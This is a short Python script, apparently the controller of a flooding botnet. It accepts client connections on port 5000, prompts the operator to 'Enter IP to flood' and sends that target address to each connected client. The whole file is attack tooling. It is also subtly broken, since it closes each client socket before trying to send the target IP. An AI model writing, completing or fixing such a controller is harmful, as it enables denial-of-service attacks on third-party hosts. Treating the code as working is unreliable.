import socket
import threading

def handle_client(client_socket, connected_clients, client_addresses, clients_lock, addresses_lock):
    try:
        print(f"Connection from {client_socket.getpeername()}")

        client_address = client_socket.getpeername()

        with clients_lock:
            if client_socket not in connected_clients:
                connected_clients.append(client_socket)

        with addresses_lock:
            if client_address not in client_addresses:
                client_addresses.add(client_address)

    except Exception as e:
        print(f"Error handling client connection: {e}")
    finally:
        client_socket.close()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 5000)
    server_socket.bind(server_address)
    server_socket.listen(5)
    print("Waiting for connections...")

    # In ra địa chỉ localhost
    print(f"Localhost Address: {socket.gethostbyname(socket.gethostname())}")

    connected_clients = []
    client_addresses = set()
    clients_lock = threading.Lock()
    addresses_lock = threading.Lock()

    while True:
        client_socket, client_address = server_socket.accept()
        handle_client(client_socket, connected_clients, client_addresses, clients_lock, addresses_lock)
        if len(client_addresses) == 1:  
            break

    ip = input("Enter IP to flood: ")
    
    for client_socket in connected_clients:
        try:
            client_socket.sendall(ip.encode())
        except Exception as e:
            print(f"Error sending IP address to client: {e}")

    for client_socket in connected_clients:
        client_socket.close()

    server_socket.close()

if __name__ == "__main__":
    main()
